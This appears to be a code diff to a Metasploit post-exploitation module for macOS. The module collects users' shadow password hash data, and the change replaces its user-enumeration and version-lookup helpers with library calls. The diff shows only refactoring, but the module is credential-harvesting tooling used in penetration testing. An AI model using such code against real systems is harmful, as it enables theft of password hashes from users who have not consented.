@@ -12,6 +12,7 @@ class MetasploitModule < Msf::Post
 
   include Msf::Post::File
   include Msf::Post::OSX::Priv
+  include Msf::Post::OSX::System
   include Msf::Auxiliary::Report
 
   def initialize(info={})
@@ -44,7 +45,8 @@ class MetasploitModule < Msf::Post
     end
 
     # iterate over all users
-    users.each do |user|
+    get_nonsystem_accounts.each do |user_info|
+      user = user_info['name']
       next if datastore['MATCHUSER'].present? and datastore['MATCHUSER'] !~ user
       print_status "Attempting to grab shadow for user #{user}..."
       if gt_lion? # 10.8+
@@ -201,16 +203,8 @@ class MetasploitModule < Msf::Post
     shadow_bytes.sub!(/^dsAttrTypeNative:ShadowHashData:/, '')
   end
 
-  # @return [Array<String>] list of user names
-  def users
-    tmp = cmd_exec("dscacheutil -q user").split(/$/).map(&:strip) #- OSX_IGNORE_ACCOUNTS
-    res = Array.new()
-    tmp.each_with_index{ |val, index| res << val.split("name: ")[1] if val.include?("name: ") and tmp[index+1].include?("**")}
-    res
-  end
-
   # @return [String] version string (e.g. 10.8.5)
   def ver_num
-    @version ||= cmd_exec("/usr/bin/sw_vers -productVersion").chomp
+    @product_version ||= get_sysinfo['ProductVersion']
   end
 end
